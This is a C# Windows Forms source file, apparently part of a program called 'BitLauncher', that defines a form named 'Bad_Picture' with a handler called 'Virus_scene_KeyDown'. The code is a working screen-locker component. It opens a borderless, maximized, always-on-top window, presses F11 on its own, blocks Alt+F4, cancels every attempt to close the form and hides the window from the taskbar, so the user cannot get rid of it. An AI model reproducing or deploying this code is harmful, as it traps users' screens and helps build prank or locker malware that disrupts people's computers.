using System;
using System.Runtime.InteropServices;

namespace BitLauncher
{
    public partial class Bad_Picture : Form
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        private const int KEYEVENTF_KEYDOWN = 0x0000;
        private const int KEYEVENTF_KEYUP = 0x0002; 

        private const byte VK_F11 = 0x7A;
        public Bad_Picture()
        {
            InitializeComponent();
            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            keybd_event(VK_F11, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
            keybd_event(VK_F11, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
        }

        private void Bad_Picture_Load(object sender, EventArgs e)
        {

        }

        private void Virus_scene_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            // Отключаем Alt+F4
            if (keyData == (Keys.Alt | Keys.F4))
            {
                return true;
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                const int WS_EX_NOACTIVATE = 0x08000000;
                const int WS_EX_APPWINDOW = 0x00040000;

                var cp = base.CreateParams;
                cp.ExStyle |= WS_EX_NOACTIVATE;
                cp.ExStyle &= ~WS_EX_APPWINDOW;

                return cp;
            }
        }
    }
}
